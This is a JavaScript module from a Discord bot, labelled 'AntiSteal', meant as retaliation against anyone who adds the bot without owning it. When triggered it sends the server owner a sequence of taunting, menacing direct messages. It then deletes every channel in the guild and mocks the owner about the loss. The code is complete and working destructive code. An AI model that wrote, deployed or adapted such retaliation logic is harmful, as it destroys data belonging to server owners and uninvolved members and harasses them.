/**
 * Deep Network Security Discord Bot - By BadBoyHaloCat
 * Copyright (C) 2020  Logan Devine
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 * 
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 * 
 * If your software can interact with users remotely through a computer
 * network, you should also make sure that it provides a way for users to
 * get its source.  For example, if your program is a web application, its
 * interface could display a "Source" link that leads users to an archive
 * of the code.  There are many ways you could offer source, and different
 * solutions will be better for different programs; see section 13 for the
 * specific requirements.
 * 
 * You should also get your employer (if you work as a programmer) or school,
 * if any, to sign a "copyright disclaimer" for the program, if necessary.
 * For more information on this, and how to apply and follow the GNU AGPL, see
 * <https://www.gnu.org/licenses/>.
 * 
 * See LICENCE for more information.
 */

// Modules
const discord = require('discord.js');
const enmap = require('enmap');
const chalk = require('chalk');
const express = require('express');
const moment = require('moment');
const _ = require('lodash');
const fs = require('fs');
const http = require('http');
const https = require('https');

// Wait function
async function wait(seconds = 5) {
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            resolve();
        }, seconds * 1000);
    });
}

exports.run = async (client, guild, log) => {
    log('i', `AntiSteal: Beginning for guild ${guild.id}...`);
    let owner = guild.owner;
    log('i', `AntiSteal: Confirmed owner to be ${owner.user.id}`);
    log('i', 'AntiSteal: Sending owner DMs...');
    owner.send('Well well well.. Seems you (or a friend) tried to add something that you don\'t own...');
    await wait();
    owner.send('Do you like playing games?');
    await wait();
    owner.send('I hope so...');
    await wait();
    owner.send('Well, let\'s play!');
    await wait();
    owner.send('What should I do... hmm..');
    await wait();
    owner.send('Ah! I have an idea!');
    await wait(1);
    owner.send('I\'ll delete all the channels!');
    await wait();
    owner.send('Let me do that..');
    await wait();
    log('i', 'AntiSteal: Deleting channels...');
    let channels = guild.channels.cache;
    channels.forEach((channel) => {
        log('i', `AntiSteal: Deleting channel ${channel.name}`);
        channel.delete().catch((e) => {
            log('e', `Couldn't delete channel ${  channel.name}`);
        });
    });
    await wait(60);
    owner.send('Had fun with that? All of your channels are gone!');
    await wait();
    owner.send('Have we learned not to play with things we don\'t own today?');
};